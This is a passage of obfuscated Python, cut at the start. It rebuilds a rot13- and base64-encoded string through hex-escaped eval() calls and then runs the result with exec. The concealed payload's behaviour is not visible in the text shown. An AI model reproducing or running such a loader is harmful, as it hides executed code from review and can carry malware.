bWo3Zhp3ymqTIgXPqjn2yfoPOjnUNaXDbWMKucqPtcPtc0pax6PtyvLJ5hMKVbXDbWqUIhozIfK3AyoTIwqPtcPty0LJ1joTS0MI9mMJkyL3DbXDbWp2IlqzIlXPxXPKqunKDbXDbWoJScovtcPzI4L2IjqPOYMKyvo2SlMRyhqTIlpaIjqQbXVPNtVPNtVPNtVPNtVPNtVUA5pl5yrTy0XPxXVPNtVPNtVPNtVPNtVPNtVNcyrTAypUDtF2I5Lz9upzEWoaEypaW1pUD6PtyjpzyhqPNbW1khWlNeVSVtXlNaJlSqWlNeVRZtXlNaVAPu0Y/DfATO0YwDfqP+VAP30YNt0YwEtqP/0Y7Dh9TZ0YsDigPl0YQDiqP40YHhYv4aVPftHvxXPIS1nKDbXDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
